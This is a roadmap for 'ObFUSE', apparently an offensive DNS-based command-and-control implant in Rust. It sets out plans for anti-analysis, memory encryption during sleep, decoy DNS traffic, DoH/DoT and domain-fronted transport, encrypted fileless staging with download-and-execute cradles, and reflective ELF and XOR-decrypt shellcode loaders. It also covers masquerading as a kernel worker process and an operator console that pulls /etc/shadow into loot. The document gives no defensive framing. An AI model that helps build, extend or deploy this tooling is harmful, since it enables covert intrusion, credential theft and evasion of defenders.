# ObFUSE v1.0 Roadmap — Full Operational Status

## Current State

The dns-c2 framework has a **fully operational core**: agent polling loop, encrypted
DNS C2 protocol (ChaCha20-Poly1305 over TXT records), 12 builtin commands, memfd
fileless execution, and Cloudflare API backend. Five new module families were added
(payload generation, traffic obfuscation, polymorphic encoding, multi-channel
transport, evasion primitives) but most are not yet wired into the agent runtime.

This roadmap takes every line of written code to operational status across 5 phases.

---

## Phase 1 — Agent Hardening

Wire evasion, encoding, and traffic shaping into the agent runtime.

### 1.1 Anti-analysis gate at agent startup

`agent::run()` calls `evasion::anti_analysis::run_all_checks()` before check-in.
If confidence exceeds a configurable threshold, the agent exits silently — no
check-in, no DNS queries, no forensic trace. New `--paranoia <0.0-1.0>` flag on
the `agent` subcommand (default 0.0 = disabled).

**Files**: `agent/mod.rs`, `main.rs`

### 1.2 Sleep obfuscation in agent loop

Replace `tokio::time::sleep()` with `evasion::sleep::obfuscated_sleep()`. The
agent's encryption key, session ID, and any buffered task data are wrapped in
`ProtectedRegion` structs. During each sleep cycle:

1. Encrypt regions with ChaCha20-Poly1305 (random key per cycle)
2. `mprotect(PROT_NONE)` on the regions
3. Sleep
4. `mprotect(PROT_READ | PROT_WRITE)` to restore
5. Decrypt regions, rotate key

The tokio async sleep moves to a blocking `std::thread::sleep` inside
`spawn_blocking` so mprotect operates on real memory, not futures state.

**Files**: `agent/mod.rs`, `evasion/sleep.rs`

### 1.3 Traffic shaping profiles

Replace the agent's manual jitter math with `traffic::shaping::TrafficProfile`.
New `--profile <aggressive|stealthy|paranoid>` flag. Each profile controls:

- Sleep distribution (exponential/Gaussian/uniform)
- Working hours enforcement (stealthy: Mon-Fri 8-18, paranoid: Tue-Thu 10-15)
- Max queries per minute
- Payload size normalization

**Files**: `agent/mod.rs`, `main.rs`

### 1.4 Decoy DNS queries

After each real C2 poll, the agent fires `TrafficProfile::generate_decoy_schedule()`
and issues DNS lookups to popular domains (google.com, microsoft.com, etc.) at
randomized intervals. Decoy-to-real ratio configurable (default 3:1 for stealthy,
10:1 for paranoid).

Implementation: async tasks spawned for each decoy query using the system resolver.

**Files**: `agent/mod.rs`, `traffic/shaping.rs`

### 1.5 Polymorphic encoding on C2 payloads

`c2::submit_response()` and `c2::send_task()` wrap data through
`encoder::EncoderChain` before the existing ChaCha20 encryption. This adds a
polymorphic layer — identical commands produce different ciphertext shapes.

Protocol change: first byte of the encrypted blob is an encoder descriptor
(0x00 = no encoding, 0x01 = light, 0x02 = medium). The decoder reads this byte
and applies the matching chain before JSON deserialization.

**Files**: `c2/mod.rs`, `encoder/mod.rs`

### 1.6 Direct syscalls in exec module

Replace `libc::syscall()` calls in `exec/linux.rs` with the typed wrappers from
`evasion::syscall::direct::*`. This is a small change but eliminates the libc
symbol dependency — the agent binary can't be hooked via LD_PRELOAD on the
execution path.

**Files**: `exec/linux.rs`

### Phase 1 deliverable

```
dns-c2 agent -d c2.example.com -k $KEY \
  --profile stealthy --paranoia 0.3
```

Agent checks environment → encrypts memory during sleep → generates decoy DNS →
uses polymorphic encoding on all comms → executes via direct syscalls.

---

## Phase 2 — Multi-Channel Transport

The agent communicates over DoH/DoT/fronted HTTPS with automatic failover.

### 2.1 DoH backend (`dns/doh.rs`)

New struct `DoHBackend` implementing `DnsBackend`. Operations:

- `create_record()` → not directly supported by DoH (DoH is read-only for
  standard resolvers). For record creation, DoH backend delegates to Cloudflare
  API over HTTPS. For record reading (`get_records`, `list_records`), it sends
  wire-format TXT queries via `reqwest::Client::post()` to the DoH endpoint with
  `Content-Type: application/dns-message`.

- Uses `traffic::doh::build_dns_query()` to construct packets,
  `traffic::doh::parse_dns_response()` to decode answers.

- Supports EDNS0 padding (`traffic::doh::build_dns_query(name, Some(128))`) to
  normalize query sizes.

- Configurable endpoint: Cloudflare, Google, Quad9, NextDNS, or custom.

**Files**: new `dns/doh.rs`, `dns/mod.rs`

### 2.2 DoT backend (`dns/dot.rs`)

New struct `DoTBackend` implementing `DnsBackend`. Opens a TLS connection to
port 853, sends DNS queries as 2-byte-length-prefixed wire-format frames
(`traffic::doh::build_dot_frame()`), reads responses.

Uses `tokio-native-tls` for TLS (already a transitive dependency via reqwest).
Connection pooling: one persistent TLS session reused across queries, reconnect
on failure.

Read-only for the same reason as DoH — record writes still go through the
Cloudflare API channel.

**Files**: new `dns/dot.rs`, `dns/mod.rs`

### 2.3 Fronted HTTPS backend (`dns/fronted.rs`)

New struct `FrontedBackend` implementing `DnsBackend`. All C2 data is sent as
HTTPS POST/GET requests through CDN infrastructure:

- `create_record()` → POST to `https://{front_domain}{path}` with
  `Host: {real_host}`, body = base64-encoded record content
- `get_records()` → GET to `https://{front_domain}{path}?name={record_name}`
  with `Host: {real_host}`
- Server-side: a small worker (Cloudflare Worker, Lambda@Edge, etc.) maps these
  HTTP requests to DNS record operations

Uses `traffic::fronting::build_fronted_request()` for request construction.
Requires a server-side component (documented, not built in this phase).

**Files**: new `dns/fronted.rs`, `dns/mod.rs`, `traffic/fronting.rs`

### 2.4 TransportChain as DnsBackend

`transport::chain::TransportChain` implements `DnsBackend`. Each method:

1. Calls `select_channel()` to pick the best channel
2. Delegates to that channel's `DnsBackend` impl
3. On success: `record_success()` with latency
4. On failure: `record_failure()`, retry with next channel
5. Exhaustion: return `TransportError::AllChannelsFailed`

The chain is the single backend passed to the agent — it handles all failover
internally.

**Files**: `transport/chain.rs`, `transport/channel.rs`, `dns/mod.rs`

### 2.5 Agent channel configuration

New `--channels` CLI flag accepting a comma-separated channel spec:

```
dns-c2 agent --channels doh:cloudflare,dot:1.1.1.1,api:cloudflare
```

Parsed into a `TransportChain` with priority order matching the flag order.
Each spec maps to a `ChannelType` + `ChannelState` with defaults.

**Files**: `main.rs`, `transport/channel.rs`

### 2.6 Alternative DNS record encodings

`traffic::encoding` functions wired as options on backends. When a TXT record
would exceed 2048 bytes, the backend can split data across:

- AAAA records (16 bytes each) via `encode_as_ip_addresses()`
- Subdomain labels (base32) via `encode_as_subdomains()`

Configured per-channel. Default remains TXT records.

**Files**: `traffic/encoding.rs`, `dns/mod.rs`

### Phase 2 deliverable

```
dns-c2 agent -d c2.example.com -k $KEY \
  --channels doh:cloudflare,doh:google,dot:quad9,api:cloudflare \
  --profile stealthy
```

Agent tries DoH to Cloudflare first. If blocked, fails over to Google DoH, then
Quad9 DoT, then direct API. All automatic, no operator intervention.

---

## Phase 3 — Encrypted Staging + Cradle Upgrade

Staged payloads are encrypted. Cradles use DoH. Compiled stager is real.

### 3.1 Encrypted staging

`cradle::stage_payload()` accepts an optional `EncryptionKey`. When provided:

1. Run payload through `encoder::EncoderChain::medium()` (polymorphic layer)
2. Encrypt with `crypto::encrypt()` (ChaCha20-Poly1305)
3. Base64-encode and chunk as before

Metadata record (`StageMeta`) gains two new fields: `encrypted: bool` and
`encoder_preset: Option<String>`.

**Files**: `cradle/mod.rs`, `encoder/mod.rs`

### 3.2 Encrypted cradles

`cradle::generate_cradle()` checks `StageMeta::encrypted`. When true:

- **Bash**: pipes decoded payload through `openssl enc -chacha20 -d` with the
  key passed as an env var, then through the matching encoder decoder
- **Python**: uses the inline `ChaCha20Poly1305` class (already scaffolded in
  `staged.rs`) plus encoder reverse passes
- **PowerShell**: uses .NET `System.Security.Cryptography` for ChaCha20

The decode key is NOT in the cradle — passed separately or derived from a
passphrase.

**Files**: `cradle/mod.rs`

### 3.3 DoH-native cradles

New cradle variant (`Shell::BashDoH`, `Shell::PwshDoH`) that fetches payload
chunks over HTTPS instead of raw DNS:

```bash
# Instead of: dig +short TXT _s.0.label.domain
# Uses:       curl -sH 'accept: application/dns-message' \
#             'https://cloudflare-dns.com/dns-query?dns=...'
```

The query parameter is base64url-encoded DNS wire format, constructed inline.
Bypasses corporate DNS inspection and DPI entirely.

**Files**: `cradle/mod.rs`, `traffic/doh.rs`

### 3.4 Compiled Rust stager

Complete the `chacha20_decrypt()` placeholder in
`payload::staged::generate_rust_stager_source()`. The generated source links
against `chacha20poly1305` and `blake3` crates. Output is a self-contained Rust
program that:

1. Queries DNS TXT records via raw UDP sockets (no libc resolver)
2. Base64-decodes the response
3. ChaCha20-Poly1305 decrypts
4. Reverses encoder chain
5. `memfd_create` + `execve`

Compile with `cargo build --release` (strip + LTO) → ~200KB static binary.

**Files**: `payload/staged.rs`

### 3.5 CLI integration

```
dns-c2 stage -d stg.example.com -f ./implant -l loader --encrypt -k $KEY
dns-c2 cradle -d stg.example.com -l loader -s bash-doh --key-env C2_KEY
```

**Files**: `main.rs`

### Phase 3 deliverable

Operator stages an encrypted payload, generates a DoH cradle one-liner, delivers
it to the target. The cradle fetches chunks over HTTPS to Cloudflare, decrypts in
memory, executes without touching disk. The payload is never visible as plaintext
in DNS records.

---

## Phase 4 — Self-Executing Payload Loaders

Donut and reflective loaders become real shellcode, not just metadata blobs.

### 4.1 x86_64 ELF reflective loader

Hand-coded x86_64 assembly (as Rust `&[u8]` constants) prepended to the RELF
package. The loader stub (~600-800 bytes):

1. Read RELF header: entry_offset, total_map_size, segment count
2. `mmap(NULL, total_map_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)` — syscall 9
3. For each PT_LOAD segment descriptor: `memcpy(base + vaddr, data + offset, filesz)`,
   zero remaining `memsz - filesz`
4. Walk `.rela.dyn` / `.rela.plt`: for each `R_X86_64_RELATIVE` relocation, write
   `*(base + offset) = base + addend`
5. If DT_INIT present: `call base + init_offset`
6. If DT_INIT_ARRAY present: iterate array, `call` each entry
7. `jmp base + entry_offset`

Decompression handled by a two-stage approach: the outer wrapper is
`generate_mmap_exec_stub()` (already working) which maps and jumps to a small Rust
decompressor, which then hands off to the reflective loader.

**Files**: `payload/reflective.rs`, `payload/shellcode.rs`

### 4.2 PIC environment keying (real implementation)

Replace the 4-NOP stub in `pic::gen_x64_env_check()` with shellcode that:

1. `open("/etc/hostname", O_RDONLY)` — syscall 2
2. `read(fd, stack_buffer, 256)` — syscall 0
3. Inline BLAKE3 compression (simplified: use SipHash or FNV-1a for size, BLAKE3
   is too large for inline asm). ~40 bytes of hash code
4. Compare against embedded 8-byte expected hash
5. On mismatch: `exit_group(0)` — syscall 231

Total: ~120 bytes of x86_64 shellcode.

**Files**: `payload/pic.rs`

### 4.3 PIC encrypted payload decryption

Replace the NOP encryption marker in `pic::gen_x64_pic_loader()` with an XOR
decryption loop:

```asm
lea rsi, [rip + key_offset]   ; XOR key (16-32 bytes)
lea rdi, [rip + data_offset]  ; encrypted payload
mov rcx, data_len
xor_loop:
  mov al, [rsi + (rcx % key_len)]
  xor [rdi + rcx], al
  dec rcx
  jnz xor_loop
```

~30 bytes. Payload is XOR'd at stage time by `pic::wrap_pic()`, decrypted in
place before the mmap+copy+jump sequence.

**Files**: `payload/pic.rs`

### 4.4 Donut — practical scope

Full Windows PE manual mapping (PEB walk, import resolution, TLS callbacks) is
out of scope for a Linux-native C2. Instead, refocus `donut.rs` on:

- **ELF-in-shellcode**: same reflective loader from 4.1, applied to the Donut
  packaging format (OBFS header + compressed + XOR'd ELF)
- **Data extraction**: the Donut header parsing remains useful for analyzing PE
  artifacts even without a Windows loader
- **.NET on Linux**: if Mono/CoreCLR is present, the loader invokes it via
  `dlopen("libcoreclr.so")` + the hosting API. Metadata from
  `generate_dotnet_loader_info()` provides class/method to invoke

**Files**: `payload/donut.rs`, `payload/reflective.rs`

### 4.5 Full-chain integration test

Stage ELF binary → encrypt → generate reflective loader shellcode → stage
shellcode to DNS → fetch via encrypted DoH cradle → execute via memfd.
Verified with MockBackend in CI.

**Files**: new `tests/payload_e2e_test.rs`

### Phase 4 deliverable

```
dns-c2 generate -f ./implant --format reflective --compress -o loader.bin
# loader.bin is ~800 bytes of stub + compressed ELF
# When jumped to, it mmaps, decompresses, relocates, and runs the implant
```

---

## Phase 5 — Operational Polish

Everything works together. Tested. Operator-friendly.

### 5.1 End-to-end test suite

New `tests/e2e_test.rs` covering:

- Agent check-in → task dispatch → response retrieval (MockBackend)
- Encrypted stage → cradle fetch → decrypt → verify hash
- Encoder chain through C2 protocol roundtrip
- Transport chain failover: primary timeout → secondary success
- Anti-analysis in clean environment → confidence < threshold
- Traffic shaping: verify timing distribution over 100 samples
- Reflective loader: stage → generate → verify header + embedded binary

**Files**: new `tests/e2e_test.rs`

### 5.2 Agent self-update

New `update` C2 command. Operator stages a new agent binary, sends `update`
task with the staging label. Agent:

1. Fetches new binary from DNS via cradle logic
2. Verifies BLAKE3 hash (provided in task args)
3. `memfd_create` + write new binary
4. `execve` to replace self — seamless upgrade, same PID session

**Files**: `agent/mod.rs`, `c2/commands.rs`

### 5.3 Embedded config

Agent reads configuration from a compile-time embedded blob or from an encrypted
DNS record (`_c2.cfg.{domain}`). Config contains:

```json
{
  "channels": ["doh:cloudflare", "dot:quad9", "api:cloudflare"],
  "profile": "stealthy",
  "paranoia": 0.3,
  "encoder": "medium",
  "poll_interval": 30,
  "jitter": 0.3
}
```

Build with: `C2_CONFIG=config.json cargo build --release`

**Files**: `agent/mod.rs`, new `config.rs`, `main.rs`, `build.rs`

### 5.4 Process masquerading

Agent calls `prctl(PR_SET_NAME, "kworker/0:1")` at startup via
`evasion::syscall::direct::prctl()`. Argv[0] overwritten in-place to match.
Process appears as a kernel worker thread in `ps` output.

**Files**: `agent/mod.rs`, `evasion/syscall.rs`

### 5.5 Operator interactive mode

`dns-c2 interactive` launches a REPL-style operator console:

```
ObFUSE C2 > sessions
  abc123  root@target1 (Ubuntu/x86_64) pid=1234 last=5s ago
  def456  user@target2 (Debian/aarch64) pid=5678 last=2m ago

ObFUSE C2 > use abc123
[abc123] > shell whoami
root
[abc123] > download /etc/shadow
[saved to ./loot/abc123/shadow]
[abc123] > exit
```

Built with basic `stdin` readline loop, no external TUI dependencies.

**Files**: new `interactive.rs`, `main.rs`

### 5.6 Documentation

Update `README.md` with all new subcommands, examples, architecture diagrams.
Document server-side requirements for fronted HTTPS (Cloudflare Worker template).

**Files**: `README.md`

### Phase 5 deliverable

A single `dns-c2` binary that serves as operator console and deployable implant.
Full test coverage. Self-updating. Process-masked. Configurable without CLI flags.

---

## Phase Summary

| Phase | Focus | Complexity | Key Outcome |
|-------|-------|-----------|-------------|
| **1** | Agent hardening | Medium | Anti-analysis, sleep encryption, traffic shaping, polymorphic comms |
| **2** | Multi-channel transport | High | DoH/DoT/fronted HTTPS with automatic failover |
| **3** | Encrypted staging | Medium | E2E encrypted payload delivery, DoH cradles, compiled stager |
| **4** | Self-executing loaders | High | Reflective ELF loader shellcode, PIC env-keying, XOR decrypt |
| **5** | Operational polish | Medium | E2E tests, self-update, interactive console, process masquerade |

Phases 1-2 are highest impact — they make the existing working agent dramatically
harder to detect and block. Phase 3 closes the staging gap. Phase 4 is the most
technically demanding (hand-coded x86_64). Phase 5 is operator quality-of-life.
